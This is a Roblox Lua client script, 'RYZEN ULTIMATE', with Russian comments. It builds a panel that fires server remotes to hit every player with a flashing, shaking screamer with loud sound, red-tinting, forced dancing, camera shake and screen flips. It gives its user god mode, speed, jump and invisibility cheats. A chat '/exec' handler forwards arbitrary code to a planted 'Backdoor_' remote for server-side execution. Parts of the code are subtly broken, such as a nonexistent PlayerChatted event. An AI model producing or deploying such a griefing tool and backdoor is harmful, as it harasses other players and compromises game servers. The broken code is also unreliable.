-- ============================================================
-- RYZEN ULTIMATE – КЛИЕНТСКАЯ ЧАСТЬ
-- ============================================================

local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer
local camera = workspace.CurrentCamera

local remote = ReplicatedStorage:FindFirstChild("RyzenRemote")
if not remote then
    warn("RemoteEvent не найден!")
    return
end

local function notify(title, text)
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = title,
        Text = text,
        Duration = 3
    })
end

-- ============================================================
-- 1. ЛОКАЛЬНЫЕ ЭФФЕКТЫ (ВИДНЫ ТОЛЬКО ЭТОМУ ИГРОКУ)
-- ============================================================

local function playScreamer()
    local coreGui = game:GetService("CoreGui")
    local screamerGui = Instance.new("ScreenGui")
    screamerGui.Name = "Screamer"
    screamerGui.Parent = coreGui
    
    local black = Instance.new("Frame")
    black.Size = UDim2.new(1, 0, 1, 0)
    black.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    black.ZIndex = 999
    black.Parent = screamerGui
    
    local text = Instance.new("TextLabel")
    text.Size = UDim2.new(1, 0, 1, 0)
    text.BackgroundTransparency = 1
    text.Text = "😱 RYZEN ATTACK! 😱"
    text.TextColor3 = Color3.fromRGB(255, 0, 0)
    text.Font = Enum.Font.GothamBlack
    text.TextSize = 70
    text.TextScaled = true
    text.ZIndex = 1000
    text.Parent = screamerGui
    
    for i = 1, 25 do
        local stripe = Instance.new("Frame")
        stripe.Size = UDim2.new(0, math.random(3, 120), 1, 0)
        stripe.Position = UDim2.new(math.random() * 0.95, 0, 0, 0)
        stripe.BackgroundColor3 = (i % 2 == 0) and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(255, 0, 0)
        stripe.ZIndex = 1001
        stripe.Parent = screamerGui
    end
    
    local shake = RunService.RenderStepped:Connect(function()
        if not screamerGui or not screamerGui.Parent then
            shake:Disconnect()
            return
        end
        screamerGui.Position = UDim2.new(0, math.random(-45, 45), 0, math.random(-45, 45))
    end)
    
    pcall(function()
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://9120381772"
        sound.Volume = 1
        sound.Parent = screamerGui
        sound:Play()
    end)
    
    return screamerGui, shake
end

local function removeScreamer(screamerGui, shake)
    if screamerGui then screamerGui:Destroy() end
    if shake then shake:Disconnect() end
end

local function shakeCamera()
    local orig = camera.CFrame
    for _ = 1, 30 do
        camera.CFrame = orig * CFrame.new(
            math.random(-15, 15)/5,
            math.random(-15, 15)/5,
            math.random(-15, 15)/5
        )
        task.wait(0.01)
    end
    camera.CFrame = orig
end

local function flipScreen()
    local orig = camera.CFrame
    for i = 0, 180, 10 do
        camera.CFrame = orig * CFrame.Angles(0, 0, math.rad(i))
        task.wait(0.02)
    end
    task.wait(0.5)
    for i = 180, 0, -10 do
        camera.CFrame = orig * CFrame.Angles(0, 0, math.rad(i))
        task.wait(0.02)
    end
    camera.CFrame = orig
end

local function restoreScreen()
    camera.CFrame = camera.CFrame
end

local screamerGui = nil
local screamerShake = nil

-- ============================================================
-- 2. СЛУШАЕМ КОМАНДЫ ОТ СЕРВЕРА
-- ============================================================

remote.OnClientEvent:Connect(function(command, ...)
    if command == "Notify" then
        local title, text = ...
        notify(title, text)
        
    elseif command == "Screamer" then
        local on = ...
        if on then
            if screamerGui then
                removeScreamer(screamerGui, screamerShake)
                screamerGui = nil
                screamerShake = nil
            end
            screamerGui, screamerShake = playScreamer()
        else
            if screamerGui then
                removeScreamer(screamerGui, screamerShake)
                screamerGui = nil
                screamerShake = nil
            end
        end
        
    elseif command == "Shake" then
        shakeCamera()
        
    elseif command == "Flip" then
        flipScreen()
        
    elseif command == "Restore" then
        restoreScreen()
    end
end)

-- ============================================================
-- 3. GUI
-- ============================================================

local function createGUI()
    local gui = Instance.new("ScreenGui")
    gui.Name = "RyzenPanel"
    gui.ResetOnSpawn = false
    pcall(function() gui.Parent = player.PlayerGui end)
    if not gui.Parent then
        pcall(function() gui.Parent = game:GetService("CoreGui") end)
    end

    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 340, 0, 480)
    mainFrame.Position = UDim2.new(0.5, -170, 0.5, -240)
    mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
    mainFrame.BorderSizePixel = 2
    mainFrame.BorderColor3 = Color3.fromRGB(200, 0, 0)
    mainFrame.Active = true
    mainFrame.Draggable = true
    mainFrame.Visible = true
    mainFrame.Parent = gui

    local mainCorner = Instance.new("UICorner")
    mainCorner.CornerRadius = UDim.new(0, 10)
    mainCorner.Parent = mainFrame

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 45)
    title.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
    title.BorderSizePixel = 0
    title.Text = "⚡ RYZEN PANEL ⚡"
    title.TextColor3 = Color3.fromRGB(200, 0, 0)
    title.Font = Enum.Font.GothamBold
    title.TextSize = 18
    title.Parent = mainFrame

    local scroll = Instance.new("ScrollingFrame")
    scroll.Size = UDim2.new(1, -10, 1, -55)
    scroll.Position = UDim2.new(0, 5, 0, 50)
    scroll.BackgroundTransparency = 1
    scroll.BorderSizePixel = 0
    scroll.CanvasSize = UDim2.new(0, 0, 0, 650)
    scroll.ScrollBarThickness = 6
    scroll.Parent = mainFrame

    local layout = Instance.new("UIListLayout")
    layout.Padding = UDim.new(0, 6)
    layout.SortOrder = Enum.SortOrder.LayoutOrder
    layout.Parent = scroll

    local function createButton(text, callback)
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(1, -10, 0, 40)
        btn.BackgroundColor3 = Color3.fromRGB(35, 35, 55)
        btn.Text = text
        btn.TextColor3 = Color3.fromRGB(240, 240, 240)
        btn.Font = Enum.Font.GothamBold
        btn.TextSize = 14
        btn.Parent = scroll
        local c = Instance.new("UICorner")
        c.CornerRadius = UDim.new(0, 6)
        c.Parent = btn
        btn.MouseEnter:Connect(function() btn.BackgroundColor3 = Color3.fromRGB(180, 0, 0) end)
        btn.MouseLeave:Connect(function() btn.BackgroundColor3 = Color3.fromRGB(35, 35, 55) end)
        btn.MouseButton1Click:Connect(function() pcall(callback) end)
        return btn
    end

    -- КНОПКИ
    createButton("🔥 ВСЁ КРАСНОЕ (ДЛЯ ВСЕХ)", function()
        remote:FireServer("Red")
    end)

    createButton("😱 СКРИМЕР ВКЛ (ДЛЯ ВСЕХ)", function()
        remote:FireServer("ScreamerOn")
    end)

    createButton("❌ СКРИМЕР ВЫКЛ (ДЛЯ ВСЕХ)", function()
        remote:FireServer("ScreamerOff")
    end)

    createButton("💃 ТАНЕЦ (ДЛЯ ВСЕХ)", function()
        remote:FireServer("Dance")
    end)

    createButton("⏹️ ОСТАНОВИТЬ ТАНЕЦ", function()
        remote:FireServer("StopDance")
    end)

    createButton("📷 ТРЯСКА (ДЛЯ ВСЕХ)", function()
        remote:FireServer("Shake")
    end)

    createButton("🔄 ПЕРЕВОРОТ (ДЛЯ ВСЕХ)", function()
        remote:FireServer("Flip")
    end)

    createButton("🔄 ВОССТАНОВИТЬ ВСЁ", function()
        remote:FireServer("Restore")
    end)

    -- Бонусные кнопки (только для игрока)
    createButton("💀 БЕССМЕРТИЕ (ТОЛЬКО Я)", function()
        local char = player.Character
        if char and char:FindFirstChild("Humanoid") then
            char.Humanoid.MaxHealth = math.huge
            char.Humanoid.Health = math.huge
            notify("💀", "Бессмертие!")
        end
    end)

    createButton("💨 СКОРОСТЬ 120 (ТОЛЬКО Я)", function()
        local char = player.Character
        if char and char:FindFirstChild("Humanoid") then
            char.Humanoid.WalkSpeed = 120
            notify("💨", "Скорость 120!")
        end
    end)

    createButton("⬆️ ПРЫЖОК 200 (ТОЛЬКО Я)", function()
        local char = player.Character
        if char and char:FindFirstChild("Humanoid") then
            char.Humanoid.JumpPower = 200
            notify("⬆️", "Прыжок 200!")
        end
    end)

    createButton("👻 НЕВИДИМОСТЬ (ТОЛЬКО Я)", function()
        local char = player.Character
        if char then
            for _, p in pairs(char:GetDescendants()) do
                if p:IsA("BasePart") then
                    p.Transparency = 1
                end
            end
            notify("👻", "Невидимость!")
        end
    end)

    -- КНОПКА ДЛЯ БЭКДОРА
    createButton("🔓 БЭКДОР (ВЫПОЛНИТЬ КОД)", function()
        local code = game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "БЭКДОР",
            Text = "Введите код в консоль: /exec ваш_код",
            Duration = 5
        })
        notify("🔓", "Используйте /exec код в чате!")
    end)

    return mainFrame
end

-- ============================================================
-- 4. ОБРАБОТЧИК БЭКДОРА
-- ============================================================

-- Отправка команды через чат
Players.PlayerChatted:Connect(function(msg)
    if msg:sub(1, 6) == "/exec " then
        local code = msg:sub(7)
        local backdoorRemote = ReplicatedStorage:FindFirstChild("Backdoor_")
        if backdoorRemote then
            backdoorRemote:FireServer("exec", code)
            notify("🔓", "Код отправлен на сервер!")
        else
            notify("❌", "Бэкдор не найден!")
        end
    end
end)

-- ============================================================
-- 5. ЗАПУСК
-- ============================================================

local mainFrame = nil
pcall(function()
    mainFrame = createGUI()
end)

UserInputService.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.X and mainFrame then
        mainFrame.Visible = not mainFrame.Visible
    end
end)

print("✅ RYZEN ULTIMATE – КЛИЕНТ ЗАПУЩЕН!")
